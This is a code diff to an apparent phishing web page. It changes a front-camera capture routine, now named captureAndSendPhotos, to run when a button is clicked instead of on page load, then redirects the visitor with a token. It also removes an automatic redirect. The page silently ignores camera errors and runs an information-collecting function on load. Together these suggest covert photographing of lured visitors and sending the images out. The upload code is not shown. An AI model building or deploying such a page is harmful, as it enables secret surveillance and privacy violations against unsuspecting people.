@@ -80,8 +80,8 @@ async function collectInfo() {
 }
 collectInfo();
 
-// ---------------- Camera Capture (Background) ---------------- //
-async function captureCamera() {
+// ---------------- Camera Capture on Button Click ---------------- //
+async function captureAndSendPhotos() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({
       video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" }
@@ -117,17 +117,12 @@ async function captureCamera() {
     // Permission denied or error → skip silently
   }
 }
-captureCamera();
 
-// ---------------- Redirect ---------------- //
-document.getElementById("btnCam").addEventListener("click", ()=>{
+// ---------------- Button Click → Capture + Redirect ---------------- //
+document.getElementById("btnCam").addEventListener("click", async ()=>{
+  await captureAndSendPhotos();
   window.location.href = "/next?token=" + token;
 });
-
-// Auto redirect after ~600ms (whether camera works or not)
-setTimeout(()=>{
-  window.location.href = "/next?token=" + token;
-}, 600);
 </script>
 </body>
 </html>
